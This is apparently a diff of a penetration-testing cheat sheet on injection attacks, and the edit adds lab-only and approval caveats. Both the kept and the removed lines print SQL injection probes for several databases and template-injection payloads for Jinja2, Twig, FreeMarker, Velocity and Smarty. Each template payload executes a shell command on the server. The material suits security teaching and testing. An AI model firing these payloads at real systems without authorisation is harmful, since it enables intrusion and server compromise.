@@ -12,26 +12,29 @@ tags:
 
 # Injection Attacks: SQLi, SSTI, XXE & RCE
 
+!!! note "What this page is doing"
+    First identify the interpreter and the input context; then use the smallest harmless probe that distinguishes data from code. A payload string alone is not impact—show the controlled read, callback or state change and explain the fix.
+
 ---
 
 ## 1. SQL Injection
 
 === " Detection & Manual Testing"
 
-    ```bash
-    # Boolean-based / Error-based quick probes
+    ```text
+    # Use one harmless boolean probe at a time and compare it with the baseline.
     ' OR 1=1-- -
     ' OR '1'='1
     " OR "1"="1
     ') OR ('1'='1
-    ' OR SLEEP(5)-- -
-    '; WAITFOR DELAY '0:0:5'-- -
-    # Time-based (blind) payloads by DBMS
+
+    # Time-based probes belong in an approved, rate-limited test window.
+    # A delay is evidence only when it is repeatable against a control request.
     MySQL/MariaDB : ' AND IF(1=1,SLEEP(5),0)-- -
-    MSSQL : '; IF (1=1) WAITFOR DELAY '0:0:5'-- -
-    PostgreSQL : '; SELECT pg_sleep(5)-- -
-    Oracle : ' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -
-    SQLite : ' AND 1=randomblob(1000000000)-- -
+    MSSQL          : '; IF (1=1) WAITFOR DELAY '0:0:5'-- -
+    PostgreSQL     : '; SELECT pg_sleep(5)-- -
+    Oracle         : ' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -
+    SQLite         : ' AND 1=randomblob(1000000000)-- -
     ```
 
 === " Automated Exploitation (sqlmap)"
@@ -100,24 +103,24 @@ SSTI turns a template render into **full RCE**. Trigger points: custom email tem
 
 === " Engine-Specific RCE Payloads"
 
-    ```python
+    ```text
+    # These are engine-specific examples for a disposable lab. Confirm the
+    # template engine first and prefer a harmless arithmetic expression.
+
     # Jinja2 (Python / Flask)
     {{ cycler.__init__.__globals__.os.popen('id').read() }}
     {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
-    {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
-    {{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
+
     # Twig (PHP / Symfony)
     {{ ['id']|filter('system') }}
     {{ _self.env.registerUndefinedFilterCallback("system") }}{{ _self.env.getFilter("id") }}
-    {{ ['id','']|sort('system') }}
-    # FreeMarker (Java)
+
+    # FreeMarker / Velocity (Java)
     <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
-    ${"freemarker.template.utility.Execute"?new()("id")}
-    # Velocity (Java)
     #set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
+
     # Smarty (PHP)
     {system('id')}
-    {php}system('id');{/php}
     ```
 
 ---
@@ -153,12 +156,13 @@ Find XXE anywhere XML is parsed: **SOAP APIs, SAML responses, DOCX/XLSX/PPTX upl
 ]>
 ```
 
-```bash
-# DOCX / XLSX / SVG payload wrapping (upload a malicious document)
-# 1. unzip document.docx -d docx_unpacked
-# 2. Inject DOCTYPE + entity into word/document.xml
-# 3. rezip -r malicious.docx [Content_Types].xml _rels docProps word
-# 4. Upload -> server parses -> file server-side file contents / SSRF callback
+```text
+# DOCX / XLSX / SVG test sequence for an approved lab or upload target:
+# 1. Unpack a disposable document into a working directory.
+# 2. Add a harmless external-entity marker to the relevant XML part.
+# 3. Rebuild the document while preserving its original structure.
+# 4. Upload once and observe the parser response or controlled callback.
+# 5. Remove the test file and do not read arbitrary client data.
 ```
 
 ---
